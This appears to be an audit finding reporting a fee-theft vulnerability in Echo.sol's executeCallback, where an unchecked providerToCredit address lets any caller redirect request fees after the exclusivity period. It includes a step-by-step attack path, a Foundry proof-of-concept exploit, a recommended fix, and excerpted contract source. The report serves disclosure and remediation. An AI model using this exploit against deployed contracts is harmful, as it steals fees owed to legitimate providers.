### Title
Unregistered `providerToCredit` Address Accepted in `executeCallback` Allows Fee Theft - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`Echo.executeCallback` accepts a caller-supplied `providerToCredit` address and unconditionally credits it with the request fee, without ever verifying that the address is a registered provider. After the exclusivity period elapses, any unprivileged transaction sender can call `executeCallback` with an arbitrary address as `providerToCredit`, redirecting the fee that should go to the legitimate provider to an attacker-controlled address.

---

### Finding Description

In `Echo.sol`, the `executeCallback` function accepts `providerToCredit` as a free parameter from the caller:

```solidity
function executeCallback(
    address providerToCredit,   // <-- caller-controlled, never validated
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
    Request storage req = findActiveRequest(sequenceNumber);

    // Exclusivity check: only enforced DURING the exclusivity window
    if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
        require(
            providerToCredit == req.provider,
            "Only assigned provider during exclusivity period"
        );
    }
    // ... price validation ...

    // Fee credited to providerToCredit with NO registration check
    _state.providers[providerToCredit].accruedFeesInWei += SafeCast
        .toUint128((req.fee + msg.value) - pythFee);
``` [1](#0-0) 

Once the exclusivity period expires, the only guard (`providerToCredit == req.provider`) is no longer enforced. The fee credit at line 161 writes to `_state.providers[providerToCredit].accruedFeesInWei` for **any** address, including one that was never registered.

By contrast, `requestPriceUpdatesWithCallback` correctly validates the provider at the time of request:

```solidity
require(
    _state.providers[provider].isRegistered,
    "Provider not registered"
);
``` [2](#0-1) 

No equivalent check exists in `executeCallback` for `providerToCredit`.

---

### Impact Explanation

An attacker can steal the full fee from a legitimate provider's pending request:

1. Attacker calls `registerProvider(0, 0, 0)` to register with zero fees (permissionless).
2. Attacker calls `setFeeManager(attackerAddress)` to set themselves as their own fee manager.
3. After the exclusivity period elapses, attacker calls `executeCallback(attackerAddress, victimSequenceNumber, validUpdateData, priceIds)`.
4. The fee (`req.fee + msg.value - pythFee`) is credited to `_state.providers[attackerAddress].accruedFeesInWei` instead of the legitimate provider.
5. Attacker calls `withdrawAsFeeManager(attackerAddress, amount)` to drain the stolen fees. [3](#0-2) [4](#0-3) 

The legitimate provider who was assigned the request receives nothing, despite having been the designated fulfiller. The attacker supplies valid Pyth `updateData` (publicly available from Hermes) and valid `priceIds` matching the request, so all other checks pass.

---

### Likelihood Explanation

- `executeCallback` is callable by **any** unprivileged address — no role or key required.
- The exclusivity period is a short configurable window (default appears to be seconds). Any request that is not fulfilled within the exclusivity window is exploitable.
- The attacker only needs to monitor the chain for unfulfilled requests and submit a valid `executeCallback` after the window, which is straightforward with public mempool/event data.
- `registerProvider` is also permissionless, so the attacker setup requires no special access. [5](#0-4) 

---

### Recommendation

Add a registration check for `providerToCredit` inside `executeCallback`, mirroring the check already present in `requestPriceUpdatesWithCallback`:

```solidity
require(
    _state.providers[providerToCredit].isRegistered,
    "providerToCredit not registered"
);
```

This should be placed before the fee credit line. Alternatively, restrict `providerToCredit` to either `req.provider` (the originally assigned provider) or a whitelist of registered providers, ensuring fees can only flow to legitimate participants.

---

### Proof of Concept

```solidity
// 1. Attacker registers as a provider with zero fees
vm.prank(attacker);
echo.registerProvider(0, 0, 0);

// 2. Attacker sets themselves as their own fee manager
vm.prank(attacker);
echo.setFeeManager(attacker);

// 3. Legitimate user creates a request for defaultProvider
vm.prank(user);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: fee}(
    defaultProvider, publishTime, priceIds, gasLimit
);

// 4. Wait for exclusivity period to expire
vm.warp(block.timestamp + exclusivityPeriod + 1);

// 5. Attacker calls executeCallback crediting themselves instead of defaultProvider
vm.prank(attacker);
echo.executeCallback(attacker, seq, updateData, priceIds);

// 6. Attacker withdraws the stolen fee
uint128 stolenFee = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolenFee);
// attacker.balance increased; defaultProvider received nothing
``` [6](#0-5)

        address providerToCredit,

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }

        // Verify priceIds match
        require(
            priceIds.length == req.priceIdPrefixes.length,
            "Price IDs length mismatch"
        );
        for (uint8 i = 0; i < req.priceIdPrefixes.length; i++) {
            // Extract first 8 bytes of the provided price ID
            bytes32 priceId = priceIds[i];
            bytes8 prefix;
            assembly {
                prefix := priceId

            // Compare with stored prefix
            if (prefix != req.priceIdPrefixes[i]) {
                // Now we can directly use the bytes8 prefix in the error
                revert InvalidPriceIds(priceIds[i], req.priceIdPrefixes[i]);

    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
    }
